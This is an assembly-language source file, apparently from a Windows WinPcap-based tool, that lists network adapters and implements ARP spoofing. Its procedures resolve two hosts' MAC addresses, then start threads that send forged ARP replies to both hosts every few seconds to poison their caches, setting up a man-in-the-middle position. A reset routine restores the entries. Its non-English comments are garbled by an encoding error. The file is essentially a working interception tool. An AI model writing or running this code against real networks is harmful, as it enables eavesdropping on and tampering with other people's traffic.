.code
;===================================================================
;===================================================================
;===================================================================
; ������� param_i(param)
; ���� - param - �������� �������� ����� ���������������� �������� ����������
; ����� - ������ ���� � ��������������� ������� �����������.
;
param_i proc param:DWORD
local counter_:DWORD
	; ������������ � ������ �����������
	invoke	pcap_findalldevs,addr alldevs,addr errbuf
	add	esp,4*2
	.if (eax == -1)
		; ����� ����� ������
		invoke	StdOut, addr szErrpcap_findalldevs							
	.endif

	assume	ecx:ptr pcap_if
	mov	ecx,alldevs
	xor	edx,edx
	; � ���������� "counter_" ������ ����� ���������������� ������ ����������
	mov	counter_,1

	@@:
	push	ecx
	mov	edx,param
	.if	 (edx == 0) ||(edx == counter_)
		invoke	StdOut, addr ParOpen
		; ����� ������ ����������
		invoke	wsprintf,addr buff, addr szformatNb,counter_
		invoke	StdOut, addr buff
		invoke	StdOut, addr ParClose

		pop	ecx
		push	ecx   
		; ����� �������������� ����������
		invoke	wsprintf,addr buff, addr szformat,[ecx]._name
		invoke	StdOut, addr buff
		invoke	StdOut, addr crlf

		pop	ecx
		push	ecx
		; ����� ���� ����������
		invoke	wsprintf,addr buff, addr szformat,[ecx].description
		invoke	StdOut, addr buff
		invoke	StdOut, addr crlf

		pop	ecx
		push	ecx 
	.endif
	; �������� �� ����� ��������� ��������� ��������� ������� �����������
	.if	([ecx].next)
		invoke	StdOut, addr crlf
		pop	ecx
		mov	ecx,[ecx].next
		inc	counter_     
		jmp	@B
	.else
		pop	ecx

	.endif  
 
	assume	ecx:nothing
	invoke	pcap_freealldevs,alldevs
	add	esp,12
	ret

param_i endp
;===================================================================
;===================================================================
;===================================================================
.data
	tab	db '	',0
	lpMacbuf	db  1024 dup(0)
	szMac	db  '%02X-%02X-%02X-%02X-%02X-%02X',0
.code
;===================================================================
;===================================================================
;===================================================================
; ������� InitARPSpoof
;
;
;
;
InitARPSpoof proc
local buffloc[128]:BYTE
	; ����� ������������ �� ���� ���������� 
;-------------------------------------------------------------------
; ������ ���������	InitSpoof()
;			|
;			|-> StaticARP() ��. StaticARP.asm
;		ARPSpoof()
;			|
;			|-> CreateThread(SpofThread()) IP_A ->IP_B -- send ARP packet 
;			|-> CreateThread(SpofThread()) IP_B ->IP_A -- send ARP packet
;
;		pcap_loop()
;-------------------------------------------------------------------
	assume	esi:ptr ARPSPOOF
	lea	esi,arpspoof

	lea	eax,[esi].szIP
	lea	edx,[esi].ucIPMAC	
	invoke	GetMAC, eax, edx
	.if	eax != 0
		mov	eax,-1
		ret
	.endif
	push	edx
	call	Print_MAC
	lea	eax,[esi].szIP
	invoke	StdOut, eax
	invoke	StdOut, addr tab
	invoke	StdOut, addr lpMacbuf 
	invoke	StdOut, addr crlf 	


	lea	eax,[esi].szTarget
	lea	edx,[esi].ucTargetMAC	
	invoke	GetMAC, eax, edx
	.if	eax != 0
		mov	eax,-1
		ret
	.endif
	push	edx
	call	Print_MAC

	lea	eax,[esi].szTarget
	invoke	StdOut, eax
	invoke	StdOut, addr tab
	invoke	StdOut, addr lpMacbuf 

	invoke	StdOut, addr crlf 	

	lea	edx,[esi].szSelfIP
	push	esi
	invoke	GetLocalIP, edx

	invoke	pcap_findalldevs,addr alldevs,addr errbuf
	add	esp, 4*2
	.if (eax == -1)
		invoke	StdOut, addr szErrpcap_findalldevs							
	.endif
	mov	eax,0
	assume	ecx:ptr pcap_if
	mov	ecx,alldevs
	assume	edx:ptr pcap_if
	mov	edx,alldevs

	.while	(eax != DevSelection)
		assume	edx:ptr pcap_if
		lea	edx,[ecx].next 
		mov	ecx,edx	
		inc	eax
	.endw
	invoke	wsprintf,addr buff, addr szformat,[edx]._name
	invoke	pcap_open_live,addr buff,\
				65536,\	;portion of the packet to capture.
					;65536 grants that the whole packet will be captured on all the MACs.
				1,\
				1,\
				addr errbuf;error buffer
	add	esp, 4*5  
	mov	adhandle,eax
	;mov	(ARPSPOOF ptr [esi]).hInterface,eax
	.if	!eax
		invoke	StdOut, addr szErrOpenDev
		invoke	pcap_freealldevs,alldevs
		add	esp, 4*1 
		jmp	__exits
	.endif

	pop	esi

	mov	eax, adhandle
	mov	[esi].hInterface,eax

	lea	eax,[esi].ucPretendMAC
	push	esi
	invoke	GetLocalMAC, adhandle, eax
	pop	esi
	lea	eax,[esi].ucSelfMAC
	push	esi
	invoke	GetLocalMAC, adhandle, eax

	pop	esi
	push	esi
	lea	eax,[esi].ucPretendMAC
	push	eax
	call	Print_MAC
	pop	esi

	lea	eax,[esi].szSelfIP
	invoke	StdOut, eax
	
	invoke	StdOut, addr crlf 	

	push	esi
	lea	eax,[esi].szIP
	lea	edx,[esi].ucIPMAC	
	invoke	StaticARP, eax, edx

	pop	esi
	lea	eax,[esi].szTarget
	lea	edx,[esi].ucTargetMAC	
	invoke	StaticARP, eax, edx
	
	xor	eax,eax
	ret
__exits:	
	mov	eax,-1
	ret  
InitARPSpoof endp
;===================================================================
;===================================================================
;===================================================================
StartARPSpoof proc

;		ARPSpoof()
;			|
;			|-> CreateThread(SpofThread()) IP_A ->IP_B -- send ARP packet 
;			|-> CreateThread(SpofThread()) IP_B ->IP_A -- send ARP packet
;
;		pcap_loop()
;-------------------------------------------------------------------
	; ��������� ����� "�" �� 192.168.1.1 -> 192.168.1.2 
	; ��� ��� ������� "��!192.168.1.2! � - 192.168.1.3!"
	invoke	malloc,sizeof ARPSPOOF
	mov	pMemory,eax
	mov	edi,pMemory
	lea	esi,arpspoof
	xor	ecx,ecx
	mov	ecx, sizeof ARPSPOOF
	rep	movsb

	lea	ebx,arpspoof
	assume	ebx:ptr ARPSPOOF
	mov	edx,pMemory
	assume	edx:ptr ARPSPOOF	

	lea	esi,dword ptr[ebx].ucIPMAC
	lea	edi,dword ptr[edx].ucTargetMAC
	mov	ecx,6
	rep	movsb

	lea	esi,dword ptr[ebx].szTarget
	lea	edi,dword ptr[edx].szIP
	mov	ecx,16
	rep	movsb

	lea	esi,dword ptr[ebx].szIP
	lea	edi,dword ptr[edx].szTarget
	mov	ecx,16
	rep	movsb

	mov	esi,pMemory
	invoke	SpoofInfo, esi
	invoke	StdOut, addr crlf 


	mov	edi,pMemory
	mov	eax, offset SpoofThread
	invoke	CreateThread, NULL, NULL, eax, edi, NULL, NULL
	mov	hThread1,eax
	invoke	GetExitCodeThread, hThread1, addr dwCode1
	invoke	Sleep,300; ��� ������� ������

	assume	esi:nothing
	assume	edi:nothing	

	invoke	malloc,sizeof ARPSPOOF
	mov	pMemory2,eax
	mov	edi,pMemory2
	lea	esi,arpspoof
	xor	ecx,ecx
	mov	ecx, sizeof ARPSPOOF
	rep	movsb

	; ��������� ����� "B" �� 192.168.1.1 -> 192.168.1.3 
	; ��� ��� ������� "��!192.168.1.3! � - 192.168.1.2!"
	lea	ebx,arpspoof
	assume	ebx:ptr ARPSPOOF
	mov	edx,pMemory2
	assume	edx:ptr ARPSPOOF

	xor	ecx,ecx

	lea	esi,dword ptr[ebx].szIP
	lea	edi,dword ptr[edx].szIP
	mov	ecx,16
	rep	movsb

	lea	esi,dword ptr[ebx].szTarget
	lea	edi,dword ptr[edx].szTarget
	mov	ecx,16
	rep	movsb


	lea	esi,dword ptr[ebx].ucTargetMAC
	lea	edi,dword ptr[edx].ucTargetMAC
	mov	ecx,6
	rep	movsb

	lea	esi,dword ptr[ebx].hInterface
	lea	edi,dword ptr[edx].hInterface
	mov	ecx,4
	rep	movsb

	mov	edi,pMemory2
	invoke	SpoofInfo, edi
	invoke	StdOut, addr crlf 

	mov	edi,pMemory2	
	mov	eax, offset SpoofThread
	invoke	CreateThread, NULL, NULL, eax, edi, NULL, NULL
	mov	hThread2,eax
	invoke	GetExitCodeThread, hThread2, addr dwCode2
	invoke	Sleep,300; ��� ������� ������


;��� �������
;.while 1
;	invoke	Sleep,300
;.endw

	assume	esi:nothing
	assume	edi:nothing
	invoke	free, pMemory	
	invoke	free, pMemory2
	xor	eax,eax	
	ret
StartARPSpoof endp

;===================================================================
;===================================================================
;===================================================================
SpoofInfo proc lparam:DWORD

	mov	edi,lparam
	assume	edi:ptr ARPSPOOF
	
	lea	eax,[edi].szTarget
	invoke	StdOut, eax
	invoke	StdOut, addr tab

	lea	eax,[edi].szIP
	invoke	StdOut, eax
	invoke	StdOut, addr tab

	lea	eax,[edi].ucPretendMAC
	push	eax
	call	Print_MAC
	
	invoke	Sleep,100
	assume	edi:nothing
	ret
SpoofInfo endp
;===================================================================
;===================================================================
;===================================================================
.data
	szStr db '-------------------------------',0
.code
SpoofThread proc lparamt:DWORD

	.while 1
		invoke	SendingARP, lparamt 
		lea	eax,(ARPSPOOF ptr [lparamt]).szIP
		lea	edx,(ARPSPOOF ptr [lparamt]).ucIPMAC	
		invoke	StaticARP, eax, edx
		invoke	Sleep,3000
	.endw
	ret
SpoofThread endp
;===================================================================
;===================================================================
;===================================================================
.data
	szDot		db '.',0			;
	szResering	db '[+] Reseting .....',0
	szSleep5		db '[+] Sleep 10s ',0
	
.code
ResetSpoof proc
	invoke	StdOut, addr szResering
	invoke	StdOut, addr crlf 

	invoke	TerminateThread, hThread1, dwCode1
	invoke	TerminateThread, hThread2, dwCode2

	invoke	free,pMemory
	invoke	free,pMemory2

	invoke	malloc,sizeof ARPSPOOF
	mov	pMemory,eax
	mov	edi,pMemory
	lea	esi,arpspoof
	xor	ecx,ecx
	mov	ecx, sizeof ARPSPOOF
	rep	movsb
	; ��������� ����� "A" �� 192.168.1.1 -> 192.168.1.2 
	; ��� ��� ������� "��!192.168.1.2! � - 192.168.1.1!"
	lea	ebx,arpspoof
	assume	ebx:ptr ARPSPOOF
	mov	edx,pMemory
	assume	edx:ptr ARPSPOOF	
	;----------------------------------------

	lea	esi,dword ptr[ebx].ucIPMAC
	lea	edi,dword ptr[edx].ucTargetMAC
	mov	ecx,6
	rep	movsb

	lea	esi,dword ptr[ebx].szTarget
	lea	edi,dword ptr[edx].szIP
	mov	ecx,16
	rep	movsb

	lea	esi,dword ptr[ebx].szIP
	lea	edi,dword ptr[edx].szTarget
	mov	ecx,16
	rep	movsb

	lea	esi,dword ptr[ebx].ucTargetMAC
	lea	edi,dword ptr[edx].ucPretendMAC
	mov	ecx,6
	rep	movsb


	mov	esi,pMemory
	invoke	SpoofInfo, esi
	invoke	StdOut, addr crlf 


	mov	edi,pMemory
	mov	eax, offset SpoofThread
	invoke	CreateThread, NULL, NULL, eax, edi, NULL, NULL
	mov	hThread1,eax
	invoke	GetExitCodeThread, hThread1, addr dwCode1
	;invoke	Sleep,300; ��� ������� ������

	invoke	Sleep,200

	invoke	malloc,sizeof ARPSPOOF
	mov	pMemory2,eax
	mov	edi,pMemory2
	lea	esi,arpspoof
	xor	ecx,ecx
	mov	ecx, sizeof ARPSPOOF
	rep	movsb

	; ��������� ����� "B" �� 192.168.1.1 -> 192.168.1.3 
	; ��� ��� ������� "��!192.168.1.3! � - 192.168.1.1!"
	lea	ebx,arpspoof
	assume	ebx:ptr ARPSPOOF
	mov	edx,pMemory2
	assume	edx:ptr ARPSPOOF
	;-----------------------------------------------------
	xor	ecx,ecx

	lea	esi,dword ptr[ebx].szIP
	lea	edi,dword ptr[edx].szIP
	mov	ecx,16
	rep	movsb

	lea	esi,dword ptr[ebx].szTarget
	lea	edi,dword ptr[edx].szTarget
	mov	ecx,16
	rep	movsb


	lea	esi,dword ptr[ebx].ucTargetMAC
	lea	edi,dword ptr[edx].ucTargetMAC
	mov	ecx,6
	rep	movsb

	lea	esi,dword ptr[ebx].hInterface
	lea	edi,dword ptr[edx].hInterface
	mov	ecx,4
	rep	movsb


	lea	esi,dword ptr[ebx].ucIPMAC
	lea	edi,dword ptr[edx].ucPretendMAC
	mov	ecx,6
	rep	movsb

	mov	edi,pMemory2
	invoke	SpoofInfo, edi
	invoke	StdOut, addr crlf 

	mov	edi,pMemory2	
	mov	eax, offset SpoofThread
	invoke	CreateThread, NULL, NULL, eax, edi, NULL, NULL
	mov	hThread2,eax
	invoke	GetExitCodeThread, hThread2, addr dwCode2
	;invoke	Sleep,300; ��� ������� ������

	invoke	StdOut, addr szSleep5

	xor	ecx,ecx
	mov	ecx,24 	
	
	.while	ecx !=0
		dec	ecx
		push	ecx
		invoke	StdOut, addr szDot
		invoke	Sleep,300
		pop	ecx
	.endw
;invoke	Sleep,3000
	invoke	StdOut, addr crlf 	
	invoke	TerminateThread, hThread1, dwCode1
	invoke	TerminateThread, hThread2, dwCode2

	invoke	free, pMemory
	invoke	free, pMemory2



	; pcap_breakloop() - ���������� ������ ������
	invoke	pcap_breakloop, adhandle 
	add	esp, 4*1
	ret	0
ResetSpoof endp
;===================================================================
;===================================================================
;===================================================================